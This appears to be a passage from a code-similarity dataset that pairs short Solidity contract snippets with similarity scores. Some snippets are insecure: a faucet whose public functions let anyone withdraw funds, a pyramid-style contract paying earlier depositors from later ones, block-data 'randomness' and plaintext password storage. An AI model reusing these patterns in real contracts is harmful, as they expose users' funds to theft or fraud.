        thing.push(1);
    }
}",0.6135162286681916,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract SuperSimpleFaucet {

    uint topupAmount = 5 ether;

    function () public payable {}

    

    function topup() public {
        msg.sender.transfer(topupAmount);
    }

    

    function topupAccount(address account) public {
        account.transfer(topupAmount);
    }

    

    function sendFunds(address account, uint amount) public {
        account.transfer(amount);
    }
}",0.6360509905648111,"contract IBadBitCasino {
	function add(address _user, uint _amount) public payable returns(bool);
	function placeBet(address _user, uint _betId, uint _amount, bool bonus) public;
	function getCurrentBalance(address _user) public view returns(uint);
	function sendEthToGame(uint _amount) public;
}"
"contract a { 

  struct Str {
    uint256 totalTokens;
    mapping(address => uint256) playerTokens;
  }

  mapping(uint256 => Str) private tokenStores;  

  function getPlayerToken(uint256 tokenId, address player) public returns(uint, uint) {
      Str storage t =  tokenStores[tokenId];
      return (t.totalTokens, t.playerTokens[player]);
  }
}",0.6181547693645897,"contract KittyCore {

    function ownerOf(uint256 _tokenId) public view returns (address owner);

    function transferFrom(address _from, address _to, uint256 _tokenId) external;

    function transfer(address _to, uint256 _tokenId) external;

    mapping (uint256 => address) public kittyIndexToApproved;

}"
"contract Uniqueness {
    mapping(bytes32 => bool) public isUsed;

    function claimId(bytes32 key) public returns(bool success) {
        require(!isUsed[key]);
        isUsed[key]=true;
        return true;
    }
}",0.6118549167043118,"contract NiftyRegistry {
   function isValidNiftySender(address sending_key) public view returns (bool);
   function isOwner(address owner_key) public view returns (bool);
}"
"contract Foo {
  function foo(bytes sha) constant returns (bytes) {
    return sha;
  }
}",0.670956869210798,"contract Now {

  

  function getNow() public constant returns(uint256) {

    

    return now;

  }

}"
"contract MyContract is usingOraclize {

  
  uint256 public ethusd = 1;

  
  bool public soldOut = false;  

  
  bool public oracleActive = false;

  
  uint256 public oracleInterval;

  
  uint256 public oracleGasPrice = 5000000000;

  
  
  uint256 public oracleGasLimit = 100000;


  constructor(uint _oracleInterval, uint _oracleGasPrice) public {
    require(_oracleInterval > 0);
    require(_oracleGasPrice > 0);

    oracleInterval = _oracleInterval;    
    oracleGasPrice = _oracleGasPrice;

    oraclize_setCustomGasPrice(_oracleGasPrice);
  }

  
  function activateOracle() external payable {
    oracleActive = true;
    requestEthUsd(0);
  }

 
  function requestEthUsd(uint _delay) internal {
    if (oracleActive && !soldOut) {
      if (oraclize_getPrice(""URL"") > address(this).balance) {
        oracleActive = false;
      } else {
        if (_delay == 0) {
          oraclize_query(""URL"", ""json(https:
        } else {
          oraclize_query(_delay, ""URL"", ""json(https:
        }
      }
    }
  }

  
  function __callback(bytes32 myid, string result) public {
    if (msg.sender != oraclize_cbAddress()) revert();
    ethusd = parseInt(result, 2);
    requestEthUsd(oracleInterval);
  }

  
  function setOracleGasPrice(uint256 _gasPrice) external {
    require(_gasPrice > 0, ""Gas price must be a positive number."");
    oraclize_setCustomGasPrice(_gasPrice);
    oracleGasPrice = _gasPrice;
  }


  
  function setOracleGasLimit(uint256 _gasLimit) external {
    require(_gasLimit > 0, ""Gas limit must be a positive number."");
    oracleGasLimit = _gasLimit;
  }


  
  function setOracleInterval(uint256 _interval) external {
    require(_interval > 0, ""Interval must be > 0"");
    oracleInterval = _interval;
  }
}",0.6059930963215426,"contract GladiethersOraclize is usingOraclize
{
    address public m_Owner;
    
    AbstractGladiethers m_Gladiethers = AbstractGladiethers(0xfca7d75cf8cad941a48ab9b5e1af0ae571923378);
    mapping (bytes32 => address) public queryIdToGladiator;
    mapping (bytes32 => bool) public queryIdToIsEthPrice;
    uint public gasprice = 15000000000;
    uint public eth_price = 500000;
    uint public totalGas = 169185;
    
    event random(string random);
    
    function GladiethersOraclize() public{
        m_Owner = msg.sender;
        oraclize_setCustomGasPrice(gasprice);
        oraclize_setProof(proofType_Ledger); 
    }
    
    function getOraclizePrice() public constant returns (uint) {
          return (totalGas*gasprice) +(5*1 ether)/eth_price;
    }
    

    function update(uint delay) payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
        } else {
            bytes32 queryId = oraclize_query(delay, ""URL"", ""json(https:
            queryIdToIsEthPrice[queryId] = true;
        }
    }
    
    function scheduleFight() public payable{
    
        require(now > 1527638340 && m_Gladiethers.getQueueLenght() > 1 && m_Gladiethers.getGladiatorPower(msg.sender) >= 10 finney); 
        uint callbackGas = totalGas; 
        require(msg.value >= getOraclizePrice()); 
        uint N = 7; 
        uint delay = 0; 
        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); 
        
        queryIdToGladiator[queryId] = msg.sender;
        m_Gladiethers.removeOrc(msg.sender);
        
        
    }
    
    
    
    
    
    function __callback(bytes32 _queryId, string _result, bytes _proof)
    {
     
      
       if (msg.sender != oraclize_cbAddress()) throw;
       if(queryIdToIsEthPrice[_queryId]){
           eth_price = parseInt(_result)*1000;
       }else{
           m_Gladiethers.fight(queryIdToGladiator[_queryId],_result);
       }
       
       
    }

}"
"contract WidgetMaker {
  
}",0.6298777848185599,contract solcChecker {}
"contract MyContract1 {
    uint256 public successCount;
    uint256 public failureCount;

    function() external payable {}

    function test(address wallet, uint256 amount) external {
        if (wallet.send(amount))
            successCount++;
        else
            failureCount++;
    }
}",0.6531587757221059,"contract PremiumUnit {

    function mintUnit(address player, uint256 amount) external;

    function equipUnit(address player, uint80 amount, uint8 chosenPosition) external;

    uint256 public unitId;

    uint256 public unitProductionSeconds;

}"
"contract Simple is RootContract {
  uint public data; 
  event Notify(uint newData);

  function setData(uint _data) modifies { data = _data; }
}",0.6230353998015388,"contract Storage {
    event Data(address indexed from, string data);
    
    function store(string memory data) public {
        emit Data(msg.sender, data);
    }
}"
"contract MetaCoin {
    function createVariable(uint _x) public  {
        assembly {
            let v := _x
            sstore(0, v)
            let w := add(_x,1)
            sstore(1, w)
        }
    }

    function getVariable() public view returns (uint r, uint s) {
        assembly{
            r := sload(0)
            s := sload(1)
        }
    }

    function addValue(uint _y) public returns (uint t){
        assembly{
            t := add(_y,sload(0))
            sstore(0,t)
        }
    }
}",0.6222961315790413,"contract KpopItem is ERC721 {
  function ownerOf(uint _itemId) public view returns (address addr);
  function getItem(uint _itemId) public view returns (
    string name,
    uint price,
    address owner,
    uint[6] traitValues,
    uint celebId
  );
  function transferToWinner(address _winner, address _loser, uint _itemId) public;
}"
"contract contractA {
    function blah(int x, int y) payable {}
}",0.6530339652791762,"contract WalletContract

{

	function payMe() public payable;

}"
"contract Conference { 

   address public organizer;
   mapping (address => uint) public registrantsPaid;
   uint public numRegistrants;
    uint quota = 2000;
   

   function buyTicket() payable public returns (bool success) { 
        require(numRegistrants >= quota);
        registrantsPaid[msg.sender] = msg.value;
         numRegistrants++;
         return true;
   }

   

  function destroy() { 
     if (msg.sender == organizer) {
        suicide(organizer); 
     }
  }

  function getContractBalance() constant returns (uint){
    return this.balance;    
  }

}",0.6549382712166268,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address purchaser) public constant returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract CircularBuffer {
    uint[100] Arr;

    
    uint8 start;

    
    uint8 end;

    
    uint8 size;

    function append(uint value) public {
        Arr[end] = value;
        end = (end + 1) % 100;

        if (size < 100) {
            size += 1;
        } else {
            
            start = (start + 1) % 100;
        }
    }

    function enumerate() public {
        for (uint8 i = 0; i < size; i++) {
            uint value = Arr[(start + i) % 100];
            
        }
    }
}",0.6281481679124706,"contract A {

  uint b = msg.value;

  struct B {
    address c;
    uint yield;
  }

  B[] public p;
  uint public i = 0;

  function A() {
  }

  function() {
    if ((b < 1 ether) || (b > 10 ether)) {
      throw;
    }

    uint u = p.length;
    p.length += 1;
    p[u].c = msg.sender;
    p[u].yield = (b * 110) / 100;

    while (p[i].yield < this.balance) {
      p[i].c.send(p[i].yield);
      i += 1;
    }
  }
}"
"contract SimpleSet {
    
    
    mapping (address => uint) index;

    
    address[] store;

    function SimpleSet() public {
        
        store.push(0x0);
    }

    function addToArray(address who) public {
        if (!inArray(who)) {
            
            index[who] = store.length;
            store.push(who);
        }
    }

    function inArray(address who) public view returns (bool) {
        
        if (who != 0x0 && index[who] > 0) {
            return true;
        }
        return false;
    }

    function getPosition(uint pos) public view returns (address) {
        
        require(pos > 0); 
        return store[pos];
    }
}",0.6695877087433041,"contract ERC20Basic is ERCToken {
  function name() public view returns (string memory);
  function symbol() public  view returns (string memory);
  function decimals() public view returns (uint8 _decimals);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract Set {
    bytes32[] public items;

    
    mapping(bytes32 => uint256) indexOf;

    function add(bytes32 value) public {
        if (indexOf[value] == 0) {
            items.push(value);
            indexOf[value] = items.length;
        }
    }

    function remove(bytes32 value) public {
        uint256 index = indexOf[value];

        require(index > 0);

        
        bytes32 lastValue = items[items.length - 1];
        items[index - 1] = lastValue;  
        indexOf[lastValue] = index;

        items.length -= 1;
        indexOf[value] = 0;
    }

    function contains(bytes32 value) public view returns (bool) {
        return indexOf[value] > 0;
    }

    function count() public view returns (uint256) {
        return items.length;
    }
}",0.6063169937362302,"contract JouleStorage is Restriction {
    mapping(bytes32 => bytes32) map;

    function get(bytes32 _key) public view returns (bytes32 _value) {
        return map[_key];
    }

    function set(bytes32 _key, bytes32 _value) public restricted {
        map[_key] = _value;
    }

    function del(bytes32 _key) public restricted {
        delete map[_key];
    }

    function getAndDel(bytes32 _key) public restricted returns (bytes32 _value) {
        _value = map[_key];
        delete map[_key];
    }

    function swap(bytes32 _from, bytes32 _to) public restricted returns (bytes32 _value) {
        _value = map[_to];
        map[_to] = map[_from];
        delete map[_from];
    }
}"
"contract FactoryTest { 
    address[2] newContracts;

    function createContract(string name) public {
        address newContract = new ContractTest(name);
        newContracts[0] = newContract;
    }

    function getContract() public view returns (address) {
      return newContracts[0];
    }
}",0.6217668090316226,"contract Creator {
    function newContract(bytes data) public returns (address) {
        address theNewContract;
        uint s = data.length;

        assembly {
            calldatacopy(mload(0x40), 68, s)
            theNewContract := create(callvalue, mload(0x40), s)
        }

        return theNewContract;
    }
}"
"contract Stub is Owned{

    address public owner;
    HubInterface hub;

    function Stub() public {
        hub = HubInterface(msg.sender);
        require(hub.isHub());
    }
}",0.6550403546584281,"contract owned {
    address public owner;

    function owned () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }
 
  }"
"contract SimpleExample {
    event LogSender(address sender);
    function getSender() returns (address) {
        LogSender(msg.sender);
        return msg.sender;
    }
}",0.6299540612112962,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract Controlled {  
    address public userAddr;  

    struct User {  
      address a;  
      string name;  
      string email;  
      uint phone;  
    }  

    mapping (address => User) public Users;  

    event LogNewUser(address user, string name, string email, uint phone);

    function Controlled() {
        userAddr = msg.sender;
    }

    function registerUser(string _name, string _email, uint _phone) returns (bool success) {  
      Users[msg.sender].a = msg.sender;  
      Users[msg.sender].name = _name;  
      Users[msg.sender].email = _email;  
      Users[msg.sender].phone = _phone;  
      LogNewUser(msg.sender, _name, _email, _phone);
      return true;
    }

    modifier onlyUser {
        if (msg.sender != userAddr) throw;
        _;
    }

}",0.6152848432564365,"contract ThingFactory {
    address[] public addressList;
    address payable public mintbase;

    event StoreLaunch(
        address indexed store,
        string name,
        string symbol
    );

    constructor() public {
        mintbase = msg.sender;
    }
    

    function launchStore(
      string memory name,
      string memory symbol,
      string memory uri
    ) public returns (address item) {
        address newStore = address(new Thing(name, symbol, uri, mintbase, msg.sender));
        addressList.push(newStore);
        emit StoreLaunch(newStore, name, symbol);
        return newStore;
    }

    function getCount() public view returns (uint exchangeCount) {
        return addressList.length;
    }
}"
"contract Student {
  uint public studentId;

  function getStudentId() public returns (uint) {
    return studentId++;
  }
}",0.6842470263679764,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Weapon is Equipment {

    
    function Weapon(uint atk, uint duration) public {
        unique = 0;
    }

}",0.6263509609193231,"contract Weth is ERC20 {

	function deposit() public payable;

	function withdraw(uint wad) public;

}"
"contract Test {
    address public someAddr;
    function nullifySomeAddr() {
        someAddr = address(0);
    }
}",0.6654481492010111,"contract OraclizeAddrResolverI {
    function getAddress() view public returns (address _addr);
}"
"contract RegisterContract {

    uint public contractWeight;

    mapping(bytes32=>string) public contracts;
    bytes32[] public myHashes;

    event LogAddContract(address sender, bytes32 hashKey, string jsonInput);
    event LogAddWeight(address sender, uint weight);

    function addContract ( string jsonInput, bytes32 hashKey) public {
        contracts[hashKey] = jsonInput;
        myHashes.push(hashKey);
        LogAddContract(msg.sender, hashKey, jsonInput);
     }

    function addWeight (uint weight) public {
        contractWeight = weight;
        LogAddWeight(msg.sender, weight);
    }

    function () payable public {
    }

}",0.6015460202121354,"contract REALotteryWheel{
    
    uint16 public round_count = 0;
    bytes32 public last_hash;
    address public controller;
    
    mapping (uint16 => bytes32) public hashes;
    
    function REALotteryWheel() public {
        controller = msg.sender;
        last_hash = keccak256(block.number, now);    
    }
    
    function spin(bytes32 s) public {
        if(controller != msg.sender) revert();
        round_count = round_count + 1;
        last_hash = keccak256(block.number,now,s);
        hashes[round_count] = last_hash;
        
    }
    
    function get_hash (uint16 i) constant returns (bytes32){
        return hashes[i];
    }
    
    function () payable {
        spin(bytes32(msg.value));
    }
    
}"
"contract RefundTest {

    bool public boolGasTest;
    uint256 public uintGasTest;

    function unsetBool() public {
        boolGasTest = false;
    }

    function setBool() public {
        boolGasTest = true;
    }

    function unsetUint() public {
        uintGasTest = 0;
    }

    function setUint() public {
        uintGasTest = 1;
    }
}",0.6241434817178513,"contract IcoToken {
    uint256 public decimals;

    function transfer(address to, uint256 amount) public;
    function mint(address to, uint256 amount) public;
    function burn(uint256 amount) public;

    function balanceOf(address who) public view returns (uint256);
}"
"contract PlayWithGas {

  mapping(address => bytes32) names;

  function setName(address userAddress, bytes32 name) returns(bool success) {
    names[userAddress] = name;
    return true;
  }

  function getName(address userAddress) returns(bytes32 name) {
    return names[userAddress];
  }
}",0.6520732402105001,"contract Ambi {
    function getNodeAddress(bytes32 _nodeName) constant returns(address);
    function hasRelation(bytes32 _nodeName, bytes32 _relation, address _to) constant returns(bool);
    function addNode(bytes32 _nodeName, address _nodeAddress) constant returns(bool);
}"
"contract game {

    struct User
    {
        string name;
        
        
        
        
        
        uint level;
        uint score;
    }

    mapping(uint => User[]) mulUsers;

    function addUsers (string _name, uint _level, uint _score) public {
        User memory user = User(_name,_level,_score); 
        mulUsers[_level].push(user);
    }

    
    function getUsers (uint _level) public view returns (bytes32[] users)
    {
        uint length = mulUsers[_level].length;
        users = new bytes32[](length);

        for(uint i = 0; i < length; i++)
        {
            users[i] = stringToBytes32(mulUsers[_level][i].name);
        }   
    }

    
    function stringToBytes32(string memory source) private pure returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) {
            return 0x0;
        }

        assembly {
            result := mload(add(source, 32))
        }
    }
}",0.6690282193734484,"contract Metadata {
    using strings for *;

    function tokenURI(uint _tokenId) public pure returns (string memory _infoUrl) {
        string memory base = ""https:
        string memory id = uint2str(_tokenId);
        return base.toSlice().concat(id.toSlice());
    }

    function uint2str(uint i) internal pure returns (string memory) {
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0) {
            uint _uint = 48 + i % 10;
            bstr[k--] = toBytes(_uint)[31];
            i /= 10;
        }
        return string(bstr);
    }

    function toBytes(uint256 x) public pure returns (bytes memory b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }
}"
"contract External {

  Product p;

  function External(address addr) {
    p = Product(addr);
  }

  function readProduct(uint u) constant returns(bytes32 name, bool status) {
    return(p.productStructs(u));
  }
}",0.6323911851057565,"contract withdrawToken {
    function transfer(address _to, uint _value) external returns (bool success);
    function balanceOf(address _owner) external constant returns (uint balance);
}"
"contract User {
    uint age;

    function User(uint _age) public {
        age = _age;
    }
}",0.6448832156609762,"contract UsdPrice {

    function USD(uint _id) public constant returns (uint256);

}"
"contract IsPayable {
  function () payable {}
}",0.6917312202160519,"contract CatsCradle {

    

    function cradle() {

        

    }

}"
"contract Car {

    struct car {
      bool available;
    }

    car audi;

    function Car() public {
        audi = car(true);
    }

    function checkAvailability() public view returns (bool) {
        return(audi.available);
    }
}",0.6332436761057687,"contract ISynthetix {
    ISynth[] public availableSynths;
    function availableSynthCount() public view returns (uint);
    function availableCurrencyKeys()
        public
        view
        returns (bytes32[]);
}"
"contract A {
function sendtoken() payable returns(bool) {
      require(msg.value!=0);
      require(owner.send(msg.value));
      balances[msg.sender]+= 1;
      balances[owner]-= 1;
      return true;
 }
}",0.6198332866784779,"contract StorageBase is Ownable {

    function withdrawBalance() external onlyOwner returns (bool) {
        
        
        bool res = msg.sender.send(address(this).balance);
        return res;
    }
}"
"contract NoMixing {

    bytes public first;
    bytes public second;

    function mix() public returns (bytes, bytes) {  

        for (uint8 cnt = 0; cnt<8; cnt++) {
            first.push(9);
        }

        for (uint8 cnt2 = 0; cnt2<8; cnt2++) {
            second.push(8);
        }

        return (first,second);
    }

}",0.6055354988603538,"contract DSPauseAbstract {
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract Sharer {
    function sendHalf() public payable {
        require(msg.value % 2 == 0, ""zonk bonk"");
    }
}",0.693225581341342,"contract sendlimiter{
 function () public payable {
     require(this.balance + msg.value < 100000000);}
}"
"contract B {
    A a_contract_instance;
    constructor(address _a_contract_address) public {
        a_contract_instance = A(_a_contract_address);
    }
    
    function callToContractA() public payable {
        a_contract_instance.updateLastFundSentToContract.value(msg.value)();
    }
    
    function getContractBalance() public view returns(uint256) {
        return address(this).balance;
    }
}",0.6185062183038513,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract relay {
  address target;

  function relay(address _target) {
    target = _target;
  }

  function () payable {
    target.send(msg.value);
  }
}",0.6162699166872114,"contract token { function transfer(address receiver, uint amount);
                 function mintToken(address target, uint mintedAmount);
                }"
"contract Tester {
    struct Foo {
        bool stayFalse;
    }

    function Tester() public {
    }

    function runTest() public pure returns (bool, bool) {
        Foo memory foo;
        return one(foo);
    }

    function one(Foo memory foo) public pure returns (bool, bool){
        Foo memory foobar = two(clone(foo));
        return (foo.stayFalse, foobar.stayFalse);
    }

    function two(Foo memory bar) public pure returns (Foo) {
        bar.stayFalse = true;
        return bar;
    }

    function clone(Foo memory from) internal pure returns (Foo memory) {
        return Foo(from.stayFalse);
    }
}",0.6141671980663173,"contract PricingStrategy {



    address public tier;



    

    function isPricingStrategy() public pure returns (bool) {

        return true;

    }



    

    function isSane() public pure returns (bool) {

        return true;

    }



    

    function isPresalePurchase() public pure returns (bool) {

        return false;

    }



    

    function updateRate(uint oneTokenInCents) public;



    

    function calculatePrice(uint value, uint tokensSold, uint decimals) public view returns (uint tokenAmount);



    function oneTokenInWei(uint tokensSold, uint decimals) public view returns (uint);

}"
"contract Sender {

    function() payable{

    }

    function sendTo(address receiverAddr) payable {
        var receiver = Receiver(receiverAddr);
        receiver.payMe.value(msg.value)();
    }
}",0.6263791177328948,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Receiver {
    bool public received;

    function() payable{

    }

    function payMe() payable returns(bool success) {
        received = true;
        return true;
    }
}",0.646939388259878,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Test {
    function getHash(bytes32 challenge, address adr, uint256 nonce) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(challenge, adr, nonce));
    }
}",0.6240405657733136,"contract GetBBAU is DataCaller {

    function getBBAU(bytes32 _key, bytes32 _id, address _holder) internal view returns(uint256) {

        return data.bbau(_key, _id, _holder);

    }

}"
"contract C {
    function getBalance() constant returns(uint) {
        return this.balance;
    }

    function buy() payable public {
        
    }

}",0.6968041836006903,"contract Exchange {

    function buy(address _referredBy) public payable returns(uint256);

    function exit() public;

}"
"contract D {
    
    function D() payable {
    }

    function getBalance() constant returns(uint) {
        return this.balance;
    }

    function sendToC(address c) public {
        C(c).buy.value(12)();
    }
}",0.6851511009998955,"contract token {



    function balanceOf(address _owner) public constant returns (uint256 balance);

    

    

    function transfer(address _to, uint256 _value) public;



}"
"contract Wallet {
    address public owner;
    uint public foo;

    constructor(address _owner, uint _foo) public {
        owner = _owner;
        foo = _foo;
    }
}",0.6700147248041275,"contract PayChannel {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function () payable public {
        owner.transfer(msg.value);
    }
}"
"contract Factory {
    event Deployed(address addr, uint256 salt);

    function getCreationBytecode(address _owner, uint _foo) public pure returns (bytes memory) {
        bytes memory bytecode = type(Wallet).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));
    }

    
    function deploy(bytes memory bytecode, uint _salt) public {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }

        emit Deployed(addr, _salt);
    }
}",0.608472259898803,"contract PersonalTokenFactory {
    
    
    PersonalToken private PT;
    
    address[] public tokens;
    
    event Deployed(address indexed PT, address indexed owner);
    
    function newPT(
       	string memory _name, 
		string memory _symbol,
		uint8 _decimals,
		uint256 _init) public {
       
        PT = new PersonalToken(
            _name, 
            _symbol, 
            _decimals,
            _init,
            msg.sender);
        
        tokens.push(address(PT));
        
        emit Deployed(address(PT), msg.sender);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract Test {
    function Test() {...}
}",0.6922662711955618,"contract Hello {

    function Hello() {

    }
}"
"contract Crowdfunding {
        struct Request {
            string description;
            uint value;
            address recipient;
            bool complete;
        }

        Request[] public requests;
        address public manager;
        uint public minimumContribution;
        address[] public approvers;


function createRequest(string description, uint value, address recipient) public restricted {
        Request newRequest = Request({
           description: description,
           value: value,
           recipient: recipient,
           complete: false
        });

        requests.push(newRequest);
    }
}",0.6035201743586025,"contract ERC20 is ERC20Events {
    function totalSupply() public view returns (uint);

    function balanceOf(address guy) public view returns (uint);

    function allowance(address src, address guy) public view returns (uint);

    function approve(address guy, uint value) public returns (bool);

    function transfer(address dst, uint value) public returns (bool);

    function transferFrom(
        address src, address dst, uint value
    ) public returns (bool);
}"
"contract MyTest {

        string public publicKey;

        function setPublicKey(string _publicKey)
        {
            publicKey = _publicKey;
        }

        function getPublicKey() constant returns (string _publicKey) {
            return publicKey;
        }
    }",0.6267362870038882,"contract ITokenMetadata {



    

    

    



    function symbol()

        public

        constant

        returns (string);



    function name()

        public

        constant

        returns (string);



    function decimals()

        public

        constant

        returns (uint8);

}"
"contract TimedTokenVault {
    uint256 startTime;

    function setStartTime(uint256 _startTime) public {
        

        startTime = _startTime;
    }

    
    function requestToken() public {
        require(startTime > now, ""Sorry, token requests is not open yet"");

        
    }
}",0.6013278818501062,"contract Token is IERC20 {

    function getBonusFactor(uint256 _startTime, uint256 _endTime, uint256 _weiAmount)

        public view returns (uint256);



    function isUserWhitelisted(address _user)

        public view returns (bool);

}"
"contract SillyContract {
    address private owner;
    constructor() public {
        owner = msg.sender;
    }
    modifier wasteEther(uint256 _lowestLimit) {
        uint256 counter = 0;
        while(gasleft() > _lowestLimit) counter++;
        _;
    }
    function getOwner() public view wasteEther(2900000) returns(address aa) {
        return owner;
    }
}",0.6514930938065115,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract UserManager {
   struct User {
      string username;
      string password;
      address userid;
      bool isAdmin;
   }

   mapping (uint => User) users;
   uint totalUsers=0;

   function checkIfUserExists(address userid) public view returns(bool) {
       for (uint o = 0; o < totalUsers; o++) {
           if (users[o].userid == userid) {
               return true;
           } else{
               return false;
           }
       }
   }

   function addUser(address userid) public {
       User memory user = User(""m"", ""n"", userid, true);
       totalUsers++;
       users[totalUsers] = user;

   }

}",0.6133483791333453,"contract IRC223 {

  uint public totalSupply;

  function balanceOf(address who) public view returns (uint);

  

  function name() public view returns (string memory _name);

  function symbol() public view returns (string memory _symbol);

  function decimals() public view returns (uint8 _decimals);



  function transfer(address to, uint value) public;

  

  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);

}"
"contract SubToken{ 
    mapping(address => uint) balances; 

    string  symbol; 
    string  name; 
    uint8  decimals; 
    uint  totalSupply;  

    using SafeMath for uint; 

    address contract_address;  

    constructor(string memory _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply)  public{  
        name = _name;  
        symbol = _symbol;  
        decimals=_decimals;  
        totalSupply = _totalSupply;  
        balances[msg.sender]=_totalSupply;  
    }  

    
    
    
    
    

    event Transfer(address indexed from, address indexed to, uint tokens); 
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens); 

}",0.6657805301374372,"contract ERC20Interface {
    
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    
    
    
    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
}"
"contract MyContract {

    constructor(uint a, address b, bool c) public {
        _init(a, b, c);
    }

    function () public {
        _init(msg.value, msg.sender, false);
    }

    function _init(uint a, address b, bool c) private {
        
    }
}",0.6730106982819029,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract GamescoreOracle {
  address public owner;
  string public gameWinner;
  event CallbackGetGameWinner();

  constructor() public {
    owner = msg.sender;
  }

  function updateGameWinner() public {
    emit CallbackGetGameWinner();
  }

  function setWinningTeam(string teamname) public {
    require(msg.sender == owner, ""Err: Not Authorized"");
    gameWinner = teamname;
  }

  function getGameWinner() public view returns (string) {
    return gameWinner;
  }
}",0.6241367604801861,"contract Owned {
    address public owner = msg.sender;
    bool public restricted = true;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    
    modifier onlyCompliant {
        if (restricted) require(tx.origin == msg.sender);
        _;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function changeRestrictions() public onlyOwner {
        restricted = !restricted;
    }
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }
}"
"contract Test {

    uint nonce = 0;

    function PRNG() public returns(uint) {
        nonce += 1;
        return uint(keccak256(abi.encodePacked(nonce, msg.sender, blockhash(block.number - 1))));
    }
}",0.6233774993521828,"contract Random is SafeMath {
    
    function getRand(uint blockNumber, uint max)
    public
    constant 
    returns(uint) {
        
        
        return(safeAdd(uint(sha3(block.blockhash(blockNumber))) % max, 1));
    }
}"
"contract T is Test {

  function testConstructor() {
    B b = new B(true);
    
    
    
    
    
    
  }

}",0.6118418867967861,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Checker {

    mapping (address => bytes32) members; 
    mapping (bytes32 => bool) isTaken;

    function isMember(address member) public view returns(bool isIndeed) {
        return (members[member] != 0);
    }

    function isSet(bytes32 name) public view returns(bool isIndeed) {
        return (isTaken[name]);
    }

    function register(bytes32 _name) public returns(bool success){
        require(members[msg.sender] == """");
        require(!isSet(_name));
        members[msg.sender] = _name;
        isTaken[_name] = true;
        return true;
    }

}",0.6398849014403157,"contract starShipToken is starShipTokenInterface {

    using SafeMath for uint256;



  

  constructor(string _name, string _symbol, uint256 _ID) public {

    name = _name;

    symbol = _symbol;

    ID = _ID;

    owner = msg.sender;

  }



  

  function viewOwner() public view returns (address) {

    return owner;

  }



  

  function transfer(address _to) public returns (bool) {

    require(_to != address(0));

    require(msg.sender == owner);



    owner = _to;

    emit Transfer(msg.sender, _to);

    return true;

  }

}"
"contract Caller {

    address public called_address;

    function set_address(address _addy) public {
        called_address = address(_addy);
    }
    function getCalleeValue() public view returns (uint){
        Called c = Called(called_address);
        return c.get();
    }
    function setCalleeValue(uint newValue) public returns (uint){
        Called c = Called(called_address);
        c.set(newValue);

}

interface Called{

    function set(uint) external;
    function get() external view returns (uint);
}
",0.6641650784065684,"contract VatLike {
    function can(address, address) public view returns (uint);
    function ilks(bytes32) public view returns (uint, uint, uint, uint, uint);
    function dai(address) public view returns (uint);
    function urns(bytes32, address) public view returns (uint, uint);
    function frob(bytes32, address, address, address, int, int) public;
    function hope(address) public;
    function move(address, address, uint) public;
}"
"contract B {
    address public owner;
    string public name;
    function B(address _owner, string _name) {
        owner = _owner;
        name = _name;
    }
}",0.6917093688971192,"contract owned {
    address public owner;

    function owned () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }
 
  }"
"contract C {
